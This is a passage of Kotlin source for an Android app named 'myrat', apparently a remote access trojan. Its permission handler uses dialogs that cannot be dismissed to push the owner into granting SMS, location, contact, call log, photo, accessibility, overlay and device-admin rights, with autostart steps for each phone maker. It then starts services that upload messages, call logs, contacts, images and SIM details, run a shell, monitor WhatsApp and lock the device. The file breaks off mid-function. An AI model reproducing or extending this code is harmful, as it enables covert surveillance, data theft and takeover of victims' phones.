package com.myrat.app.handler

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.service.CallLogUploadService
import com.myrat.app.service.CallService
import com.myrat.app.service.ContactUploadService
import com.myrat.app.service.ImageUploadService
import com.myrat.app.service.LocationService
import com.myrat.app.service.ShellService
import com.myrat.app.service.SmsService
import com.myrat.app.service.LockService
import com.myrat.app.service.WhatsAppService
import com.myrat.app.utils.Logger
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: AppCompatActivity,
    private val simDetailsHandler: SimDetailsHandler
) {
    private val activityRef = WeakReference(activity)
    private val activity: AppCompatActivity?
        get() = activityRef.get()
    
    private var fromSettings = false
    private var requestingRestricted = false
    private var fromOverlaySettings = false
    private var fromOtherPermissionsSettings = false
    private var fromBatteryOptimizationSettings = false
    private var fromDeviceAdminSettings = false
    private var fromAccessibilitySettings = false
    private var fromExactAlarmSettings = false
    private var hasVisitedOtherPermissions = false
    private var isProcessingPermissions = false
    private var currentDialog: AlertDialog? = null
    private val handler = Handler(Looper.getMainLooper())
    private val manufacturer = Build.MANUFACTURER.lowercase()

    // Enhanced permission lists with Android 15 compatibility
    private val restrictedPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            add(Manifest.permission.USE_BIOMETRIC)
        }
        // Android 15 specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.VANILLA_ICE_CREAM) {
            add(Manifest.permission.SCHEDULE_EXACT_ALARM)
            add(Manifest.permission.USE_EXACT_ALARM)
        }
    }

    private val phonePermissions = mutableListOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CALL_PHONE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_PHONE_CALL)
        }
    }

    private val storagePermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private val internetPermission = listOf(Manifest.permission.INTERNET)
    private val queryPackagesPermission = listOf(Manifest.permission.QUERY_ALL_PACKAGES)

    private val lockPermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            add(Manifest.permission.FOREGROUND_SERVICE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_LOCATION)
            add(Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC)
            add(Manifest.permission.FOREGROUND_SERVICE_SPECIAL_USE)
        }
        add(Manifest.permission.WAKE_LOCK)
        add(Manifest.permission.DISABLE_KEYGUARD)
        add(Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
    }

    private val nonRestrictedPermissions = phonePermissions + storagePermissions + internetPermission + queryPackagesPermission + lockPermissions
    private val allPermissions = restrictedPermissions + nonRestrictedPermissions

    private val permissionLauncher = try {
        activity?.registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { permissions ->
            Logger.log("Permission results: $permissions")
            safeExecute { handlePermissionResults(permissions) }
        }
    } catch (e: Exception) {
        Logger.error("Failed to register permission launcher", e)
        null
    }

    private fun safeExecute(action: () -> Unit) {
        try {
            val currentActivity = activity
            if (currentActivity != null && !currentActivity.isFinishing && !currentActivity.isDestroyed) {
                action()
            } else {
                Logger.error("Cannot execute action: Activity is null, finishing, or destroyed")
            }
        } catch (e: Exception) {
            Logger.error("Error in safeExecute", e)
        }
    }

    private fun dismissCurrentDialog() {
        try {
            currentDialog?.let { dialog ->
                if (dialog.isShowing) {
                    dialog.dismiss()
                }
            }
            currentDialog = null
        } catch (e: Exception) {
            Logger.error("Error dismissing dialog", e)
        }
    }

    fun requestPermissions() {
        safeExecute {
            if (isProcessingPermissions) {
                Logger.log("Already processing permissions, skipping duplicate request")
                return@safeExecute
            }
            
            isProcessingPermissions = true
            
            try {
                val permissionsToRequest = nonRestrictedPermissions.filter {
                    ContextCompat.checkSelfPermission(activity!!, it) != PackageManager.PERMISSION_GRANTED
                }
                
                if (permissionsToRequest.isEmpty()) {
                    Logger.log("All non-restricted permissions already granted")
                    startServicesForFeature(Feature.GENERAL)
                    handler.postDelayed({ requestRestrictedPermissions() }, 1000)
                } else {
                    Logger.log("Requesting non-restricted permissions: $permissionsToRequest")
                    requestingRestricted = false
                    showPermissionRationaleDialog(Feature.GENERAL, permissionsToRequest)
                }
            } catch (e: Exception) {
                Logger.error("Error in requestPermissions", e)
            } finally {
                isProcessingPermissions = false
            }
        }
    }

    private fun requestRestrictedPermissions() {
        safeExecute {
            try {
                val permissionsToRequest = restrictedPermissions.filter {
                    ContextCompat.checkSelfPermission(activity!!, it) != PackageManager.PERMISSION_GRANTED
                }
                
                if (permissionsToRequest.isEmpty()) {
                    Logger.log("All restricted permissions already granted")
                    startServicesForFeature(Feature.RESTRICTED)
                    handler.postDelayed({ configureDeviceSpecificSettings() }, 1000)
                } else {
                    Logger.log("Requesting restricted permissions: $permissionsToRequest")
                    requestingRestricted = true
                    showPermissionRationaleDialog(Feature.RESTRICTED, permissionsToRequest)
                }
            } catch (e: Exception) {
                Logger.error("Error in requestRestrictedPermissions", e)
            }
        }
    }

    fun requestPermissionsForFeature(feature: Feature) {
        safeExecute {
            try {
                val permissions = when (feature) {
                    Feature.RESTRICTED -> restrictedPermissions
                    Feature.PHONE -> phonePermissions
                    Feature.STORAGE -> storagePermissions
                    Feature.INTERNET -> internetPermission + queryPackagesPermission
                    Feature.LOCK -> lockPermissions
                    Feature.WHATSAPP -> internetPermission + queryPackagesPermission
                    Feature.GENERAL -> nonRestrictedPermissions
                }
                
                val permissionsToRequest = permissions.filter {
                    ContextCompat.checkSelfPermission(activity!!, it) != PackageManager.PERMISSION_GRANTED
                }
                
                if (permissionsToRequest.isEmpty()) {
                    Logger.log("All ${feature.name} permissions already granted")
                    startServicesForFeature(feature)
                    if (feature == Feature.GENERAL) {
                        handler.postDelayed({ requestRestrictedPermissions() }, 1000)
                    }
                } else {
                    Logger.log("Requesting ${feature.name} permissions: $permissionsToRequest")
                    requestingRestricted = feature == Feature.RESTRICTED
                    showPermissionRationaleDialog(feature, permissionsToRequest)
                }
            } catch (e: Exception) {
                Logger.error("Error in requestPermissionsForFeature", e)
            }
        }
    }

    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        safeExecute {
            try {
                val deniedPermissions = permissions.filter { !it.value }.keys.toList()
                if (deniedPermissions.isEmpty()) {
                    Logger.log("All requested permissions granted")
                    if (!requestingRestricted) {
                        startServicesForFeature(Feature.GENERAL)
                        handler.postDelayed({ requestRestrictedPermissions() }, 1500)
                    } else {
                        startServicesForFeature(Feature.RESTRICTED)
                        handler.postDelayed({ configureDeviceSpecificSettings() }, 1500)
                    }
                } else {
                    Logger.log("Permissions denied: $deniedPermissions")
                    val showRationale = deniedPermissions.any { permission ->
                        try {
                            activity!!.shouldShowRequestPermissionRationale(permission)
                        } catch (e: Exception) {
                            Logger.error("Error checking rationale for $permission", e)
                            false
                        }
                    }
                    if (showRationale) {
                        Logger.log("Showing rationale for denied permissions")
                        showPermissionRationaleDialog(
                            if (requestingRestricted) Feature.RESTRICTED else Feature.GENERAL,
                            deniedPermissions
                        )
                    } else {
                        Logger.log("Permissions denied permanently. Requesting manual settings.")
                        showRestrictedSettingsDialog()
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in handlePermissionResults", e)
            }
        }
    }

    private fun showPermissionRationaleDialog(feature: Feature, permissions: List<String>) {
        safeExecute {
            try {
                dismissCurrentDialog()
                
                val message = getPermissionMessageForFeature(feature)
                
                currentDialog = AlertDialog.Builder(activity!!)
                    .setTitle("Permissions Required")
                    .setMessage(message)
                    .setPositiveButton("Grant") { _, _ ->
                        try {
                            permissionLauncher?.launch(permissions.toTypedArray())
                        } catch (e: Exception) {
                            Logger.error("Failed to launch permission request", e)
                            showRestrictedSettingsDialog()
                        }
                    }
                    .setNegativeButton("Go to Settings") { _, _ ->
                        fromSettings = true
                        openAppSettings()
                    }
                    .setCancelable(false)
                    .setOnDismissListener { currentDialog = null }
                    .create()
                    
                currentDialog?.show()
            } catch (e: Exception) {
                Logger.error("Failed to show rationale dialog", e)
                openAppSettings()
            }
        }
    }

    private fun getPermissionMessageForFeature(feature: Feature): String {
        val baseMessage = when (feature) {
            Feature.RESTRICTED -> "SMS, Location, Biometric, and Alarm permissions are required for core app functionality, including lock features."
            Feature.PHONE -> "Phone permissions are needed to make calls, access call logs, and contacts."
            Feature.STORAGE -> "Storage permissions are needed to access images."
            Feature.INTERNET -> "Internet and package query permissions are required for network connectivity and app monitoring (e.g., WhatsApp)."
            Feature.LOCK -> "Foreground service, wake lock, battery optimization, and system alert permissions are required for device lock and screen management features."
            Feature.WHATSAPP -> "Internet and package query permissions are required to monitor WhatsApp and WhatsApp Business."
            Feature.GENERAL -> "This app requires all permissions to function properly, including WhatsApp monitoring, lock, and screen management features."
        }
        
        val manufacturerNote = when (manufacturer) {
            "xiaomi" -> "\n\nNote for Xiaomi devices: You may also need to enable 'Autostart' and 'Display pop-up windows' in MIUI Security settings."
            "oppo" -> "\n\nNote for OPPO devices: You may also need to enable 'Auto-launch' and 'Display over other apps' in Phone Manager."
            "vivo" -> "\n\nNote for Vivo devices: You may also need to enable 'High background app limit' and 'Display over other apps' in iManager."
            "huawei" -> "\n\nNote for Huawei devices: You may also need to enable 'Auto-launch' and 'Display over other apps' in Phone Manager."
            "samsung" -> "\n\nNote for Samsung devices: You may also need to disable battery optimization in Device Care."
            "oneplus" -> "\n\nNote for OnePlus devices: You may also need to enable 'Auto-launch' and disable battery optimization."
            else -> ""
        }
        
        return "$baseMessage Please grant all permissions.$manufacturerNote"
    }

    private fun openAppSettings() {
        safeExecute {
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:${activity!!.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                activity!!.startActivity(intent)
            } catch (e: Exception) {
                Logger.error("Failed to open app settings", e)
            }
        }
    }

    private fun startServicesForFeature(feature: Feature) {
        safeExecute {
            try {
                Logger.log("Starting services for feature: ${feature.name}")
                when (feature) {
                    Feature.RESTRICTED -> {
                        startAppropriateService(Intent(activity!!, SmsService::class.java))
                        startAppropriateService(Intent(activity!!, LocationService::class.java))
                    }
                    Feature.PHONE -> {
                        try {
                            simDetailsHandler.uploadSimDetails()
                        } catch (e: Exception) {
                            Logger.error("Failed to upload SIM details", e)
                        }
                        startAppropriateService(Intent(activity!!, CallLogUploadService::class.java))
                        startAppropriateService(Intent(activity!!, ContactUploadService::class.java))
                        startAppropriateService(Intent(activity!!, CallService::class.java))
                    }
                    Feature.STORAGE -> {
                        startAppropriateService(Intent(activity!!, ImageUploadService::class.java))
                    }
                    Feature.INTERNET, Feature.WHATSAPP -> {
                        if (internetPermission.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED } &&
                            queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                            startAppropriateService(Intent(activity!!, ShellService::class.java))
                            startAppropriateService(Intent(activity!!, WhatsAppService::class.java))
                        } else {
                            Logger.log("Cannot start ShellService or WhatsAppService: Missing INTERNET or QUERY_ALL_PACKAGES permission")
                        }
                    }
                    Feature.LOCK -> {
                        startAppropriateService(Intent(activity!!, LockService::class.java))
                    }
                    Feature.GENERAL -> {
                        if (phonePermissions.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                            try {
                                simDetailsHandler.uploadSimDetails()
                            } catch (e: Exception) {
                                Logger.error("Failed to upload SIM details in GENERAL", e)
                            }
                            startAppropriateService(Intent(activity!!, CallLogUploadService::class.java))
                            startAppropriateService(Intent(activity!!, ContactUploadService::class.java))
                            startAppropriateService(Intent(activity!!, CallService::class.java))
                        }
                        if (storagePermissions.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                            startAppropriateService(Intent(activity!!, ImageUploadService::class.java))
                        }
                        if (internetPermission.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED } &&
                            queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                            startAppropriateService(Intent(activity!!, ShellService::class.java))
                            startAppropriateService(Intent(activity!!, WhatsAppService::class.java))
                        }
                        if (lockPermissions.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                            startAppropriateService(Intent(activity!!, LockService::class.java))
                        }
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error starting services for feature: ${feature.name}", e)
            }
        }
    }

    private fun startAllServices() {
        safeExecute {
            try {
                if (!areAllPermissionsGranted()) {
                    Logger.log("Cannot start services: Not all permissions are granted")
                    requestPermissions()
                    return@safeExecute
                }
                Logger.log("All permissions granted, ensuring all services are started")
                
                try {
                    simDetailsHandler.uploadSimDetails()
                } catch (e: Exception) {
                    Logger.error("Failed to upload SIM details in startAllServices", e)
                }
                
                val services = listOf(
                    SmsService::class.java,
                    LocationService::class.java,
                    CallLogUploadService::class.java,
                    ContactUploadService::class.java,
                    CallService::class.java,
                    ImageUploadService::class.java,
                    LockService::class.java
                )
                
                services.forEach { serviceClass ->
                    startAppropriateService(Intent(activity!!, serviceClass))
                }
                
                if (internetPermission.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED } &&
                    queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity!!, ShellService::class.java))
                    startAppropriateService(Intent(activity!!, WhatsAppService::class.java))
                }
            } catch (e: Exception) {
                Logger.error("Error in startAllServices", e)
            }
        }
    }

    private fun startAppropriateService(intent: Intent) {
        safeExecute {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    activity!!.startForegroundService(intent)
                } else {
                    activity!!.startService(intent)
                }
                Logger.log("Started service: ${intent.component?.className}")
            } catch (e: Exception) {
                Logger.error("Failed to start service: ${intent.component?.className}", e)
            }
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        return try {
            val currentActivity = activity ?: return false
            
            val standardPermissionsGranted = allPermissions.all {
                ContextCompat.checkSelfPermission(currentActivity, it) == PackageManager.PERMISSION_GRANTED
            }
            val overlayPermissionGranted = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(currentActivity)
            val batteryOptimizationDisabled = try {
                (currentActivity.getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(currentActivity.packageName)
            } catch (e: Exception) {
                Logger.error("Error checking battery optimization", e)
                false
            }
            val deviceAdminActive = try {
                (currentActivity.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
                    .isAdminActive(ComponentName(currentActivity, MyDeviceAdminReceiver::class.java))
            } catch (e: Exception) {
                Logger.error("Error checking device admin", e)
                false
            }
            val accessibilityEnabled = isAccessibilityServiceEnabled()
            val exactAlarmGranted = checkExactAlarmPermission()
            
            val allGranted = standardPermissionsGranted && overlayPermissionGranted && batteryOptimizationDisabled && deviceAdminActive && accessibilityEnabled && exactAlarmGranted
            Logger.log("Permissions status: standard=$standardPermissionsGranted, overlay=$overlayPermissionGranted, battery=$batteryOptimizationDisabled, admin=$deviceAdminActive, accessibility=$accessibilityEnabled, exactAlarm=$exactAlarmGranted")
            allGranted
        } catch (e: Exception) {
            Logger.error("Error checking all permissions", e)
            false
        }
    }

    private fun checkExactAlarmPermission(): Boolean {
        return try {
            val currentActivity = activity ?: return false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = currentActivity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                alarmManager.canScheduleExactAlarms()
            } else {
                true // Not required on older versions
            }
        } catch (e: Exception) {
            Logger.error("Error checking exact alarm permission", e)
            true // Assume granted if we can't check
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val currentActivity = activity ?: return false
            val expectedService = "${currentActivity.packageName}/${WhatsAppService::class.java.canonicalName}"
            val accessibilityManager = currentActivity.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            enabledServices.any { it.id == expectedService }
        } catch (e: Exception) {
            Logger.error("Error checking accessibility service", e)
            false
        }
    }

    fun handleResume() {
        safeExecute {
            try {
                when {
                    fromSettings -> {
                        fromSettings = false
                        Logger.log("Returned from settings. Checking permissions.")
                        handler.postDelayed({
                            if (allPermissions.all { ContextCompat.checkSelfPermission(activity!!, it) == PackageManager.PERMISSION_GRANTED }) {
                                startServicesForFeature(Feature.GENERAL)
                                startServicesForFeature(Feature.RESTRICTED)
                                handler.postDelayed({ configureDeviceSpecificSettings() }, 1000)
                            } else {
                                requestPermissions()
                            }
                        }, 1000)
                    }
                    fromOverlaySettings -> {
                        fromOverlaySettings = false
                        Logger.log("Returned from overlay settings.")
                        handler.postDelayed({ checkOverlayPermission() }, 1000)
                    }
                    fromOtherPermissionsSettings -> {
                        fromOtherPermissionsSettings = false
                        Logger.log("Returned from other permissions settings.")
                        handler.postDelayed({
                            startServicesForFeature(Feature.PHONE)
                            startServicesForFeature(Feature.INTERNET)
                            startServicesForFeature(Feature.LOCK)
                            startServicesForFeature(Feature.WHATSAPP)
                            enableManufacturerSpecificAutostart()
                        }, 1000)
                    }
                    fromDeviceAdminSettings -> {
                        fromDeviceAdminSettings = false
                        Logger.log("Returned from device admin settings.")
                        handler.postDelayed({ checkDeviceAdminPermission() }, 1000)
                    }
                    fromBatteryOptimizationSettings -> {
                        fromBatteryOptimizationSettings = false
                        Logger.log("Returned from battery optimization settings.")
                        handler.postDelayed({ checkBatteryOptimization() }, 1000)
                    }
                    fromAccessibilitySettings -> {
                        fromAccessibilitySettings = false
                        Logger.log("Returned from accessibility settings.")
                        handler.postDelayed({ checkAccessibilityPermission() }, 1000)
                    }
                    fromExactAlarmSettings -> {
                        fromExactAlarmSettings = false
                        Logger.log("Returned from exact alarm settings.")
                        handler.postDelayed({ checkOverlayPermission() }, 1000)
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in handleResume", e)
            }
        }
    }

    private fun showRestrictedSettingsDialog() {
        safeExecute {
            try {
                dismissCurrentDialog()
                
                val message = getManufacturerSpecificMessage()
                
                currentDialog = AlertDialog.Builder(activity!!)
                    .setTitle("All Permissions Required")
                    .setMessage(message)
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromSettings = true
                        openAppSettings()
                    }
                    .setCancelable(false)
                    .setOnDismissListener { currentDialog = null }
                    .create()
                    
                currentDialog?.show()
            } catch (e: Exception) {
                Logger.error("Failed to show restricted settings dialog", e)
                openAppSettings()
            }
        }
    }

    private fun getManufacturerSpecificMessage(): String {
        val baseMessage = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location, Biometric, Foreground Service, Exact Alarm, and WhatsApp monitoring permissions."
        
        return when (manufacturer) {
            "xiaomi" -> "$baseMessage\n\nFor Xiaomi devices:\n• Enable 'Autostart' in Security app\n• Enable 'Display pop-up windows'\n• Disable battery optimization\n• Enable all 'Other permissions'"
            "oppo" -> "$baseMessage\n\nFor OPPO devices:\n• Enable 'Auto-launch' in Phone Manager\n• Enable 'Display over other apps'\n• Disable battery optimization\n• Enable background app permissions"
            "vivo" -> "$baseMessage\n\nFor Vivo devices:\n• Enable 'High background app limit'\n• Enable 'Display over other apps'\n• Disable battery optimization\n• Enable auto-start permissions"
            "huawei" -> "$baseMessage\n\nFor Huawei devices:\n• Enable 'Auto-launch' in Phone Manager\n• Enable 'Display over other apps'\n• Disable battery optimization\n• Enable startup management"
            "samsung" -> "$baseMessage\n\nFor Samsung devices:\n• Disable battery optimization in Device Care\n• Enable 'Allow background activity'\n• Enable 'Auto restart apps'"
            "oneplus" -> "$baseMessage\n\nFor OnePlus devices:\n• Enable 'Auto-launch'\n• Disable battery optimization\n• Enable 'Allow background activity'"
            else -> baseMessage
        }
    }

    private fun configureDeviceSpecificSettings() {
        safeExecute {
            Logger.log("Starting device-specific settings configuration for $manufacturer")
            checkExactAlarmPermissionFirst()
        }
    }

    private fun checkExactAlarmPermissionFirst() {
        safeExecute {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val alarmManager = activity!!.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                    if (!alarmManager.canScheduleExactAlarms()) {
                        Logger.log("Exact alarm permission not granted, prompting user")
                        
                        dismissCurrentDialog()
                        currentDialog = AlertDialog.Builder(activity!!)
                            .setTitle("Exact Alarm Permission Required")
                            .setMessage("This app requires permission to schedule exact alarms for proper service restart and background functionality. Please grant this permission.")
                            .setPositiveButton("Go to Settings") { _, _ ->
                                fromExactAlarmSettings = true
                                try {
                                    val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                                        data = Uri.parse("package:${activity!!.packageName}")
                                    }
                                    activity!!.startActivity(intent)
                                } catch (e: Exception) {
                                    Logger.error("Failed to open exact alarm settings", e)
                                    checkOverlayPermission()
                                }
                            }
                            .setCancelable(false)
                            .setOnDismissListener { currentDialog = null }
                            .create()
                            
                        currentDialog?.show()
                    } else {
                        Logger.log("Exact alarm permission granted or not required")
                        checkOverlayPermission()
                    }
                } else {
                    Logger.log("Exact alarm permission not required on this Android version")
                    checkOverlayPermission()
                }
            } catch (e: Exception) {
                Logger.error("Failed to check exact alarm permission", e)
                checkOverlayPermission()
            }
        }
    }

    private fun checkOverlayPermission() {
        safeExecute {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity!!)) {
                    Logger.log("Overlay permission not granted, prompting user")
                    
                    dismissCurrentDialog()
                    currentDialog = AlertDialog.Builder(activity!!)
                        .setTitle("Overlay Permission Required")
                        .setMessage("This app requires permission to draw over other apps to enable WhatsApp monitoring and lock functionality. Please grant this permission.")
                        .setPositiveButton("Go to Settings") { _, _ ->
                            fromOverlaySettings = true
                            try {
                                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                                    data = Uri.parse("package:${activity!!.packageName}")
                                }
                                activity!!.startActivity(intent)
                            } catch (e: Exception) {
                                Logger.error("Failed to open overlay settings", e)
                                checkOtherPermissions()
                            }
                        }
                        .setCancelable(false)
                        .setOnDismissListener { currentDialog = null }
                        .create()
                        
                    currentDialog?.show()
                } else {
                    Logger.log("Overlay permission granted or not required")
                    checkOtherPermissions()
                }
            } catch (e: Exception) {
                Logger.error("Failed to check overlay permission", e)
                checkOtherPermissions()
            }
        }
    }

    private fun checkOtherPermissions() {
        safeExecute {
            try {
                if (hasVisitedOtherPermissions) {
                    Logger.log("User has already visited Other permissions settings, assuming granted")
                    enableManufacturerSpecificAutostart()
                    return@safeExecute
                }

                val intent = createManufacturerSpecificIntent("permissions")
                val message = getOtherPermissionsMessage()

                Logger.log("Prompting user for Other permissions")
                
                dismissCurrentDialog()
                currentDialog = AlertDialog.Builder(activity!!)
                    .setTitle("Other Permissions Required")
                    .setMessage(message)
                    .setPositiveButton("Go to Settings") { _, _ ->
                        hasVisitedOtherPermissions = true
                        fromOtherPermissionsSettings = true
                        try {
                            activity!!.startActivity(intent)
                        } catch (e: Exception) {
                            Logger.error("Failed to open other permissions settings", e)
                            enableManufacturerSpecificAutostart()
                        }
                    }
                    .setCancelable(false)
                    .setOnDismissListener { currentDialog = null }
                    .create()
                    
                currentDialog?.show()
            } catch (e: Exception) {
                Logger.error("Failed to check other permissions", e)
                enableManufacturerSpecificAutostart()
            }
        }
    }

    private fun getOtherPermissionsMessage(): String {
        return when (manufacturer) {
            "xiaomi" -> "For Xiaomi devices, please enable:\n• Display pop-up windows\n• Start in background\n• Show on lock screen\n• All other permissions under 'Other permissions'"
            "oppo" -> "For OPPO devices, please enable:\n• Allow pop-up windows\n• Start in background\n• Display over other apps\n• All background permissions"
            "vivo" -> "For Vivo devices, please enable:\n• Allow background pop-ups\n• Start in background\n• Display over other apps\n• High background app limit"
            "huawei" -> "For Huawei devices, please enable:\n• Pop-up windows\n• Start in background\n• Display over other apps\n• All startup permissions"
            "samsung" -> "For Samsung devices, please enable:\n• Pop-up windows\n• Start in background\n• Allow background activity\n• All special permissions"
            "oneplus" -> "For OnePlus devices, please enable:\n• Display over other apps\n• Start in background\n• Allow background activity\n• All advanced permissions"
            else -> "This app requires permissions under 'Other permissions' (e.g., Display pop-up windows, Start in background) to function. Please enable these permissions."
        }
    }

    private fun enableManufacturerSpecificAutostart() {
        safeExecute {
            try {
                val intent = createManufacturerSpecificIntent("autostart")
                activity!!.startActivity(intent)
                Logger.log("Opened autostart settings for $manufacturer")
            } catch (e: Exception) {
                Logger.error("Autostart setting failed for $manufacturer", e)
                openAppSettings()
            }
            handler.postDelayed({ checkDeviceAdminPermission() }, 2000)
        }
    }

    private fun createManufacturerSpecificIntent(type: String): Intent {
        return try {
            when (manufacturer) {
                "xiaomi" -> when (type) {
                    "permissions" -> Intent().apply {
                        setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity"))
                        putExtra("extra_pkgname", activity!!.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    "autostart" -> Intent().apply {
                        setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"))
                        putExtra("package_name", activity!!.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    else -> createFallbackIntent()
                }
                "oppo" -> when (type) {
                    "permissions" -> Intent().apply {
                        setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.PermissionManagerActivity"))
                        putExtra("package_name", activity!!.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    "autostart" -> Intent().apply {
                        setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
                        putExtra("pkgName", activity!!.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    else -> createFallbackIntent()
                }
                "vivo" -> Intent().apply {
                    setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phonepower.BackgroundPowerManagerActivity"))
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                "huawei" -> when (type) {
                    "permissions" -> Intent().apply {
                        setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.permissionmanager.ui.MainActivity"))
                        putExtra("packageName", activity!!.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    "autostart" -> Intent().apply {
                        setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
                        putExtra("app_pkg", activity!!.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    else -> createFallbackIntent()
                }
                "samsung" -> Intent().apply {
                    setComponent(ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.battery.BatteryActivity"))
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                "oneplus" -> Intent().apply {
                    setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"))
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                else -> createFallbackIntent()
            }
        } catch (e: Exception) {
            Logger.error("Error creating manufacturer intent for $manufacturer", e)
            createFallbackIntent()
        }
    }

    private fun createFallbackIntent(): Intent {
        return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${activity!!.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
    }

    private fun checkDeviceAdminPermission() {
        safeExecute {
            try {
                val devicePolicyManager = activity!!.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                val adminComponent = ComponentName(activity!!, MyDeviceAdminReceiver::class.java)

                if (!devicePolicyManager.isAdminActive(adminComponent)) {
                    Logger.log("Device admin permission not granted, prompting user")
                    
                    dismissCurrentDialog()
                    currentDialog = AlertDialog.Builder(activity!!)
